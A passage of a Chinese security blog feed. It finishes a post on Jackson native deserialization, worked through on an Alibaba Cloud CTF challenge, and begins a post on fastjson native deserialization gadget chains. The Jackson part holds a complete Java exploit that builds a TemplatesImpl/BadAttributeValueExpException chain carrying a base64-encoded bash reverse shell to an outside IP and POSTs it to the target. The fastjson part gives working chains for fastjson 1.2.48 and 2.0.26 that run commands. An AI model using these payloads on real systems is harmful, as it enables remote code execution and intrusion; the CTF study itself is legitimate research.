alt="image-20241013123431941"></p><p>可以看到这里会判断序列化类是否实现了writeReplace方法，实现了则会进行调用，而在BaseJsonNode中实现了该方法，在该方法调用的时候抛出了异常</p><p><img src="https://cdn.clown2024.cn/202410131237369.png" alt="image-20241013123712324"></p><p>文章中直接将该方法注释或删去就正常了，我勒个简单粗暴啊😢</p><p>这里需要重写一下jar包，之前没写过顺便记录一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.找到你所要重写的方法的所在类，查看其中的路径；<br><br>2.在我们的src目录下新建一个同包名同类名的类；<br><br>3.将jar包中的重写方法所在类的所有代码复制到我们新建的同包名同类名的类中；<br><br>4.在我们新建的同包名同类名的类中修改对应的方法中的代码<br><br>原理：<br>编译输出的时候会优先使用我们src下面的类，而不是优先使用Jar包里面的类，这样就达到了覆盖jar包方法的目的<br></code></pre></td></tr></table></figure><p>参考文章：<a href="https://blog.csdn.net/qq_41512902/article/details/125558275">https://blog.csdn.net/qq_41512902/article/details/125558275</a></p><p>最后改成这样就行了</p><p><img src="https://cdn.clown2024.cn/202410131251160.png" alt="image-20241013125145111"></p><p>再去打一遍exp试试</p><p><img src="https://cdn.clown2024.cn/202410131252817.png" alt="image-20241013125207733"></p><p>现在就能正常弹计算器了</p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>这里就那阿里云ctf的一道题来作为例子</p><p>题目附件：<a href="https://github.com/Drun1baby/CTF-Repo-2023/tree/main/2023/%E9%98%BF%E9%87%8C%E4%BA%91CTF/web/bypassit1">https://github.com/Drun1baby/CTF-Repo-2023/tree/main/2023/%E9%98%BF%E9%87%8C%E4%BA%91CTF/web/bypassit1</a></p><p>反编译下jar包</p><p><img src="https://cdn.clown2024.cn/202410131311887.png" alt="image-20241013131145827"></p><p>就几行代码，直接读取数据反序列化</p><p>看了一下依赖就只有springboot，那肯定是打jackson了，springboot依赖默认用jackson，而且都放到这当例题了</p><p>那就可以用前面的exp打一个Jackson原生反序列化，这里还要考虑一个问题就是payload的发送，因为这里没有base64解码直接copy过去会出错，我这里直接用java发请求过去</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.attack;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.HttpURLConnection;<br><span class="hljs-keyword">import</span> java.net.URL;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">attack_usual</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-comment">//生成恶意类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjEuMjguMjQ3Lzg4ODggMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(templates);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonNodes);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">byte</span>[] byteArray = barr.toByteArray();<br>        System.out.println(byteArray);<br><br>        <span class="hljs-comment">//发送Post请求</span><br>        <span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;http://localhost:8080/bypassit&quot;</span>);<br>        <span class="hljs-type">HttpURLConnection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> (HttpURLConnection) url.openConnection();<br>        conn.setRequestMethod(<span class="hljs-string">&quot;POST&quot;</span>);<br>        conn.setDoOutput(<span class="hljs-literal">true</span>);<br>        conn.setRequestProperty(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/octet-stream&quot;</span>);<br>        conn.getOutputStream().write(byteArray);<br>        conn.getOutputStream().flush();<br><br>        <span class="hljs-comment">// 读取响应</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">responseCode</span> <span class="hljs-operator">=</span> conn.getResponseCode();<br>        System.out.println(<span class="hljs-string">&quot;Response Code: &quot;</span> + responseCode);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>记得要删除writeReplace方法</p></blockquote><p>反弹shell过来即可</p><p><img src="https://cdn.clown2024.cn/202410140030909.png" alt="image-20241014003050846"></p><p>或者直接序列化存入文件，然后用python发请求</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url=<span class="hljs-string">&quot;&quot;</span><br>data=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>)<br>res=requests.post(url,data=data)<br></code></pre></td></tr></table></figure><h1 id="其他链子"><a href="#其他链子" class="headerlink" title="其他链子"></a>其他链子</h1><p>比如Templates被ban的情况下用SignObject打二次反序列化，可以看这篇文章：<a href="https://xz.aliyun.com/t/12966?time__1311=GqGxuD9QLxlr=iQGkDRQI23Ezabx&u_atoken=8440f6b703af0eb6335929f9798f602f&u_asig=ac11000117287520205018812e007f#toc-34">https://xz.aliyun.com/t/12966?time__1311=GqGxuD9QLxlr%3DiQGkDRQI23Ezabx&amp;u_atoken=8440f6b703af0eb6335929f9798f602f&amp;u_asig=ac11000117287520205018812e007f#toc-34</a></p><p>还有其余的就在做题时遇到再学吧</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考文章：&lt;a href=&quot;https://xz.aliyun.com/t/12509?u_atoken=0f8fa2b10f046b73ed286030e1ee9f9e&amp;u_asig=1a0c381017287414696367848e00f7&quot;&gt;https://xz.a</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="反序列化" scheme="https://clowsman.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>fastjson原生反序列化</title>
    <link href="https://clowsman.github.io/2024/10/11/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/10/11/fastjson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-10-11T04:15:15.000Z</published>
    <updated>2024-10-11T09:21:33.257Z</updated>
    
    <content type="html"><![CDATA[<p>看了fastjson的各版本链子，再看一下fastjson的原生反序列化，看的是y4师傅的两篇文章</p><p><a href="https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</a></p><p><a href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/">https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/</a></p><p>来简单的学习复现一下</p><h1 id="利用限制"><a href="#利用限制" class="headerlink" title="利用限制"></a>利用限制</h1><p>Fastjson1版本小于等于1.2.48(不过1.2.49之后也有绕过方法，这里指的是直接用不需要绕过的)</p><p>Fastjson2&lt;&#x3D;2.0.26(我自己测试刚好在文章版本的下一个版本2.0.27开始就不行了)</p><h1 id="找链子"><a href="#找链子" class="headerlink" title="找链子"></a>找链子</h1><p>要用原生反序列化，就需要寻找fastjson中继承了Serializable接口的类，fastjson里面有两个这样的类：JSONArray与JSONObject</p><p>这两个类的利用方式差不多，这里用JSONArray这个类</p><p>这两个本身是没有实现readObject方法的，所以是通过其他类的readObject来触发JSONArray与JSONObject中的某个方法来形成链子。</p><p>文章中的就是利用JSON的toString方法触发JSON的toJsonString的调用</p><p><img src="https://cdn.clown2024.cn/202410111309567.png" alt="image-20241011130936507"></p><p>这和JSONObject以及JSONArray有什么关系呢，我去看了源码，JSONArray和JSONObject是JSON的子类，他们本身是没有toString方法的，所以会调用到其父类JSON的toString方法</p><p>那为什么要触发toString呢，因为JSONObject和JSONArray在触发toString方法的时候会调用get方法，欸那就可以用来将我们的链子封装在里面来触发了</p><p>get触发例子</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Student构造函数&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-comment">// JSONObject调用toString</span><br>        HashMap&lt;String,Object&gt; hashMap=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;clown&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">org</span>.clown.Test1.Student());<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>(hashMap);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">string</span> <span class="hljs-operator">=</span> jsonObject.toString();<br>        System.out.println(<span class="hljs-string">&quot;-----------------------&quot;</span>);<br><br>        <span class="hljs-comment">// JSONArray调用toString</span><br>        ArrayList&lt;Object&gt; arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        arrayList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>());<br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">objects</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>(arrayList);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">string1</span> <span class="hljs-operator">=</span> objects.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410111324454.png" alt="image-20241011132452413"></p><p>至于为什么toString会调用getter方法就看文章的分析了解一下就好了</p><h1 id="利用链构造"><a href="#利用链构造" class="headerlink" title="利用链构造"></a>利用链构造</h1><p>能触发getter方法就很容易想到通过触发TemplatesImpl的getOutputProperties方法实现加载任意字节码最终触发恶意方法调用</p><p>然后触发toString方法我们可以利用BadAttributeValueExpException来触发，该类在cc和rome链都有用到</p><p>那么链子我们就可以写出来了，这里用javassist动态生成恶意类</p><p><strong>利用依赖</strong></p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.28.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br> <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.48<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p><strong>利用链</strong></p><p>fastjson1的利用</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//生成恶意类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonArray);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410111336619.png" alt="image-20241011133609518"></p><p>fastjson2利用</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson2.JSONArray;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonArray);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410111341193.png" alt="image-20241011134159108"></p><p>JSONObject的利用也一样，就不再写一遍了</p><h1 id="为什么fastjson1249以后不再能利用"><a href="#为什么fastjson1-2-49以后不再能利用" class="headerlink" title="为什么fastjson1.2.49以后不再能利用"></a>为什么fastjson1.2.49以后不再能利用</h1><p>因为从1.2.49开始，JSONArray以及JSONObject方法开始有了自己的readObject方法</p><p><img src="https://cdn.clown2024.cn/202410111346927.png" alt="image-20241011134629872"></p><p>在其<code>SecureObjectInputStream</code>类当中重写了<code>resolveClass</code>,在其中调用了<code>checkAutoType</code>方法做类的检查</p><p><img src="https://cdn.clown2024.cn/202410111350600.png" alt="image-20241011135009543"></p><p>所以后面就是我们如何进行绕过的问题了</p><h1 id="fastjson1249后绕过"><a href="#fastjson1-2-49后绕过" class="headerlink" title="fastjson1.2.49后绕过"></a>fastjson1.2.49后绕过</h1><p>他检查的逻辑是这样的，当调用JSONArray&#x2F;JSONObject的Object方法触发反序列化时，将这个反序列化过程委托给<code>SecureObjectInputStream</code>处理时，触发resolveClass实现对恶意类的拦截</p><p>看起来很正常，但实际上他的反序列化的逻辑是不安全，他是不安全的ObjectInputStream套个安全的SecureObjectInputStream导致了绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ObjectInputStream -&gt; readObject<br>xxxxxx(省略中间过程)<br>SecureObjectInputStream -&gt; readObject -&gt; resolveClass<br></code></pre></td></tr></table></figure><p><strong>安全的反序列化写法</strong></p><p>我们正常的安全反序列化写法应该是这样的，生成一个继承ObjectInputStream的类并重写resolveClass(假定为TestInputStream)，由它来做反序列化的入口，这样才是安全的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">TestInputStream -&gt; readObject -&gt; 